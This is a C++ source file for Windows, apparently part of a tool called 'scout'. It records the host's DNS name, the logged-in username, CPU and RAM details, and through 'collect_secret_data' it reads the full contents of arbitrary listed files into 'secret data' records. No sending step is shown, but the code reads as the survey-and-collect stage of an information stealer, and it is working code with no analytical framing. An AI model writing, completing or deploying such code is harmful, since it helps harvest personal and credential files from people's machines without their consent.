#include "scout.hpp"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <filesystem>
#include <fstream>
#include <vector>

namespace {

    std::optional<std::vector<std::byte>> read_file_bytes(const std::filesystem::path& path) {
        std::ifstream file(path, std::ios::binary | std::ios::ate);
        if (!file) return std::nullopt;

        const std::streamsize size = file.tellg();
        if (size <= 0) return std::nullopt;
        file.seekg(0);

        std::vector<std::byte> bytes(static_cast<std::size_t>(size));
        if (!file.read(reinterpret_cast<char*>(bytes.data()), size)) {
            return std::nullopt;
        }

        return bytes;
    }

    std::string wide_to_utf8(std::wstring_view wstr) {
        if (wstr.empty()) return {};

        int size_needed = WideCharToMultiByte(
            CP_UTF8, 0, wstr.data(), static_cast<int>(wstr.size()),
            nullptr, 0, nullptr, nullptr
        );
        if (size_needed <= 0) return {};
        std::string result(size_needed, 0);
        WideCharToMultiByte(
            CP_UTF8, 0, wstr.data(), static_cast<int>(wstr.size()),
            result.data(), size_needed, nullptr, nullptr
        );
        return result;
    }

}

namespace scoutreg {

    std::optional<SystemInfo> collect_system_info() {
        SystemInfo info;

        load_hostname(info);
        load_username(info);
        load_cpu(info);
        load_ram(info);
        
        return info;
    }
    
    // DNS Hostname
    void load_hostname(SystemInfo& info) {
        wchar_t host_buffer[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD host_len = MAX_COMPUTERNAME_LENGTH + 1;
        if (GetComputerNameExW(ComputerNameDnsHostname, host_buffer, &host_len)) {
            info.hostname = wide_to_utf8({ host_buffer, host_len });
        }
    }

    // Current username
    void load_username(SystemInfo& info) {
        wchar_t user_buffer[256];
        DWORD user_len = 256;
        if (GetUserNameW(user_buffer, &user_len)) {
            info.username = wide_to_utf8({user_buffer, user_len > 0 ? user_len - 1 : 0});
        }
    }

    // CPU Cores & Architecture
    void load_cpu(SystemInfo& info) {
        SYSTEM_INFO sys_info;
        GetNativeSystemInfo(&sys_info);
        info.cpu_cores = sys_info.dwNumberOfProcessors;
        switch (sys_info.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64: info.cpu_arch = "x86_64"  ; break ;
            case PROCESSOR_ARCHITECTURE_ARM64: info.cpu_arch = "ARM64"   ; break ;
            case PROCESSOR_ARCHITECTURE_INTEL: info.cpu_arch = "x86"     ; break ;
            default:                           info.cpu_arch = "Unknown" ; break ;
        }
    }

    // RAM Maximum & Available
    void load_ram(SystemInfo& info) {
        MEMORYSTATUSEX mem_status{.dwLength = sizeof(MEMORYSTATUSEX)};
        if (GlobalMemoryStatusEx(&mem_status)) {
            info.total_ram = mem_status.ullTotalPhys / (1024 * 1024);
            info.available_ram = mem_status.ullAvailPhys / (1024 * 1024);
        }
    }

    std::vector<SecretData> collect_secret_data(const std::vector<std::string>& paths) {
        std::vector<SecretData> gathered;
        gathered.reserve(paths.size());

        for (const auto& path : paths) {
            if (const auto bytes = read_file_bytes(path)) {
                gathered.push_back(SecretData{
                    .filename = std::filesystem::path(path).filename().string(),
                    .content  = std::move(*bytes)
                });
            }
        }

        return gathered;
    }

}
